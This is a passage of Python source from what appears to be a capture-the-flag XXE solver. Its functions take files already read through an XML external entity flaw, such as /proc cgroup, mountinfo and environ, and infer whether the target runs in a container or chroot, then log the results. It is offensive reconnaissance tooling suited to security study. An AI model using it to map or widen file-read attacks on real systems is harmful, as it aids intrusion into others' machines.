        segments = [seg for seg in parts[2].strip().split("/") if seg]
        for label, pattern in _CGROUP_SEGMENT_RULES:
            hit = next((seg for seg in segments if pattern.match(seg)), None)
            if hit is not None:
                return label, f"cgroup segment {hit!r}"
        for label, parent in _CGROUP_PARENT_RULES:
            for left, right in zip(segments, segments[1:]):
                if left == parent:
                    return label, f"cgroup path /{left}/{right}"
    return None


def _mountinfo_runtime(rows):
    root_mount = _mountinfo_root_mount(rows)
    if root_mount is not None and root_mount[1] == "overlay":
        options = root_mount[2] or ""
        label = next((name for name, marker in _OVERLAY_RUNTIME_RULES if marker in options),
                     "unknown")
        return label, "'/' is an overlay filesystem (container image root)"
    for root, mount_point, _fstype, _options in rows:
        if mount_point not in _BIND_MOUNT_POINTS:
            continue
        for label, marker in _BIND_ROOT_RULES:
            if marker in root:
                return label, f"{mount_point} is bind-mounted from {root!r}"
    return None


def _environ_runtime(text: str):
    for entry in re.split(r"[\x00\n]", text):
        key, sep, value = entry.partition("=")
        if not sep:
            continue
        if key == "KUBERNETES_SERVICE_HOST" and value:
            return "kubernetes", "KUBERNETES_SERVICE_HOST is set"
        if key == "container" and value.strip():
            runtime = value.strip().lower()
            if not re.fullmatch(r"[a-z0-9][a-z0-9._-]{0,31}", runtime):
                runtime = "unknown"
            return runtime, f"container={value.strip()[:32]!r} is set"
    return None


def _container_runtime(rows):
    """First container signal from cgroup/mountinfo/environ reads, preferring
    the orchestrator (kubernetes) over the engine under it."""
    signals = []
    for resource, text in rows:
        if text is None:
            continue
        if resource.endswith("/cgroup"):
            hit = _cgroup_runtime(text)
        elif resource.endswith("/mountinfo"):
            hit = _mountinfo_runtime(_mountinfo_rows(text))
        elif resource.endswith("/environ"):
            hit = _environ_runtime(text)
        else:
            continue
        if hit is not None:
            signals.append((hit[0], f"{resource}: {hit[1]}"))
    if not signals:
        return None, None
    for label in _RUNTIME_PRIORITY:
        for runtime, evidence in signals:
            if runtime == label:
                return runtime, evidence
    return signals[0]


def _map_scan_text(content) -> str:
    if content is None:
        return ""
    if isinstance(content, (bytes, bytearray)):
        text = bytes(content[:MAP_MAX_SCAN]).decode("utf-8", "replace")
    else:
        text = str(content)[:MAP_MAX_SCAN]
    return text


def _map_observations(observations):
    """Normalize many caller shapes into an ordered [(resource, text_or_None)]."""
    rows = []
    if isinstance(observations, dict):
        items = list(observations.items())
    else:
        items = []
        try:
            for entry in observations or []:
                if isinstance(entry, dict):
                    resource = entry.get("resource") or entry.get("path") or entry.get("name")
                    if "content" in entry:
                        content = entry.get("content")
                    elif entry.get("readable") is False:
                        content = None
                    else:
                        content = entry.get("text") or entry.get("body")
                    items.append((resource, content))
                elif isinstance(entry, (list, tuple)) and len(entry) == 2:
                    items.append((entry[0], entry[1]))
        except TypeError:
            items = []
    seen = set()
    for resource, content in items[:MAP_MAX_OBSERVATIONS]:
        if not isinstance(resource, str) or not resource.startswith("/"):
            continue
        if resource in seen:
            continue
        seen.add(resource)
        text = _map_scan_text(content)
        rows.append((resource, text if text.strip() else None))
    return rows


def map_traversal_confinement(observations):
    """Map the confinement of a confirmed XXE read from saved observations.

    ``observations`` maps absolute resource paths to the bytes/text the parser
    returned for each (``None``/empty where the read did not resolve); a list of
    ``{"resource", "content"}`` dicts or ``(resource, content)`` pairs is also
    accepted.  Returns a deterministic summary: which roots are reachable, the
    deepest path read, whether a container runtime or a chroot/pivot_root is
    evident, and a single conservative ``confinement`` label.  Never does I/O and
    never submits.
    """
    rows = _map_observations(observations)
    reachable = [resource for resource, text in rows if text is not None]
    unreachable = [resource for resource, text in rows if text is None]
    by_resource = {resource: text for resource, text in rows}

    roots = sorted({"/" + resource.split("/", 2)[1] for resource in reachable
                    if len(resource.split("/", 2)) > 1 and resource.split("/", 2)[1]})
    max_depth = max((len([p for p in resource.split("/") if p]) for resource in reachable),
                    default=0)

    # Container-runtime detection: structured cgroup/mountinfo/environ reads only.
    runtime, evidence = _container_runtime(rows)
    container = {"detected": runtime is not None, "runtime": runtime, "evidence": evidence}

    # Chroot: /proc/self/root is the reader's OWN root, so under a chroot a read
    # through it hits the same file as a direct read and proves nothing; it is
    # deliberately not used.  Two signals that can differ:
    #  1. a read through PID 1's root link (/proc/1/root/<p>) differs from a
    #     direct <p> read: this process's root is not the namespace's root;
    #  2. the mountinfo row whose mount point is "/" has a root field (4th) other
    #     than "/": the process root is a subdirectory of that filesystem.
    chroot_evidence = None
    for resource, text in rows:
        if text is None or not resource.startswith(_INIT_ROOT_PREFIX):
            continue
        tail = resource[len(_INIT_ROOT_PREFIX) - 1:]
        direct = by_resource.get(tail)
        if direct is not None and direct.strip() != text.strip():
            chroot_evidence = f"{resource} differs from a direct {tail} read"
            break
    mount_notes = []
    if chroot_evidence is None:
        for resource, text in rows:
            if text is None or not resource.endswith("/mountinfo"):
                continue
            mount_rows = _mountinfo_rows(text)
            if not mount_rows:
                continue
            root_mount = _mountinfo_root_mount(mount_rows)
            if root_mount is None:
                # The kernel omits every mount whose mount point lies outside
                # the reader's root, so a classic chroot into a directory that
                # is not itself a mount point shows no "/" row at all.  A read
                # cut short at the scan cap may simply have lost that row.
                if len(text) >= MAP_MAX_SCAN:
                    mount_notes.append(f"{resource} was truncated at {MAP_MAX_SCAN} bytes "
                                       "before any row mounted at '/'; not counted as a chroot")
                    continue
                chroot_evidence = (f"{resource}: {len(mount_rows)} mount(s) listed but none at "
                                   "'/': the root is not a mount point (classic chroot)")
                break
            mount_root, fstype, _options = root_mount
            if mount_root == "/":
                continue
            if fstype == "btrfs" and mount_root.count("/") == 1:
                # A btrfs subvolume root ("/@", "/@rootfs") is the normal host
                # layout on many distros, not a chroot: report, do not claim.
                mount_notes.append(f"'/' is btrfs subvolume {mount_root!r} in {resource}; "
                                   "not counted as a chroot")
                continue
            chroot_evidence = (f"{resource}: '/' is mounted from {mount_root!r} "
                               f"of a {fstype or 'unknown'} filesystem, not its root")
            break
    chroot = {"suspected": chroot_evidence is not None, "evidence": chroot_evidence}

    if not reachable:
        confinement = "no-read"
    elif container["detected"]:
        confinement = "container"
    elif chroot["suspected"]:
        confinement = "chroot_or_jail"
    else:
        confinement = "filesystem-read"

    notes = []
    if container["detected"]:
        notes.append(f"container runtime {runtime!r} evident from {evidence!r}")
    if chroot["suspected"]:
        notes.append("process root differs from the real root; reads are behind a chroot/pivot_root")
    if reachable and not container["detected"] and not chroot["suspected"]:
        notes.append("reads succeed but no container/chroot marker was supplied; map is inconclusive")
    notes.extend(mount_notes)
    if unreachable:
        notes.append(f"{len(unreachable)} probed path(s) did not resolve")

    return {
        "reachable": sorted(reachable),
        "unreachable": sorted(unreachable),
        "roots_reachable": roots,
        "max_path_depth": max_depth,
        "container": container,
        "chroot_or_jail": chroot,
        "confinement": confinement,
        "notes": notes,
        "offline": True,
        "network_requests": 0,
    }


def solve(target, ctx=None):
    """Solve one target; never raises and never submits."""
    ctx = dict(ctx) if isinstance(ctx, dict) else {}
    runner = _Runner(target, ctx)
    proof = None
    try:
        proof = runner.run()
    except Exception as exc:
        runner.stopped = runner.stopped or f"error: {type(exc).__name__}"
    finally:
        runner.stop_now()
    _surface(runner, ctx)
    summary = runner.summary(proof)
    aid = runner.target.get("answer_id") or "target"
    sink = ctx.get("result_sink")
    if isinstance(sink, dict):
        sink[aid] = summary
    _write_log(ctx.get("log_dir"), ctx.get("challenge"), aid, summary)
    return proof


def solve_targets(targets, ctx=None):
    """Run independent targets under the caller's shared absolute deadline."""
    out = {}
    try:
        items = list(targets or [])
    except TypeError:
        return out
    for index, target in enumerate(items):
        if not isinstance(target, dict):
            continue
        item = dict(target)
        aid = str(item.get("answer_id") or item.get("id") or f"target-{index + 1}")
        item["answer_id"] = aid
        out[aid] = solve(item, ctx)
    return out


def _write_log(log_dir, challenge, aid, summary):
    if not log_dir:
        return
    try:
        folder = Path(log_dir)
        folder.mkdir(parents=True, exist_ok=True)
        row = {"at": _dt.datetime.now().astimezone().isoformat(timespec="seconds"),
               "challenge": challenge, "answer_id": aid, **summary}
        with (folder / "xxe_read.jsonl").open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(row, separators=(",", ":"), default=str) + "\n")
    except Exception:
        pass
